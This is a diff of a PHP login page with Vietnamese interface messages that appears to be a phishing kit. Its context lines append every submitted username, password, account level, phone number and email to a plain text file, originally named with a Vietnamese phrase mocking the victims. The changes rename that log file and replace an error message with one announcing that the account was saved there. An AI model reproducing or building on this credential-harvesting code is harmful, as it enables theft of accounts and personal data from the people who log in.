@@ -243,7 +243,7 @@ $json2=$matches2[1];
 
 
             $emailv = $infoacc['user_info']['email_v'];
-            $file = fopen('tonghopnhungthangngu.txt', 'a+');
+            $file = fopen('accounthere.txt', 'a+');
             fwrite($file,date("d/m/Y").' '.$username . ' / ' . $password. ' level '.$Level. ' so '.$Shell.' sdt '.$Phone.' email '.$Email. "\n");
             fclose($file);
             //header("Location: captcha.php");
@@ -321,7 +321,7 @@ $json2=$matches2[1];
 <?php } elseif ($check == 1) {?>
 <span id="msg2" class="errorMsg"><em></em>Máy chủ quá tải, thử lại sau!</span><br>
 <?php } elseif ($check == 2) {?>
-    <span id="msg3" class="errorMsg"><em></em>Máy chủ đang bận, thử lại sau!</span><br>
+    <span id="msg3" class="errorMsg"><em></em>Đăng nhập thành công, account được lưu vào accounthere.txt</span><br>
 <?php }?></center>
 <br>
 <div class="divider"><span>hoặc</span></div>
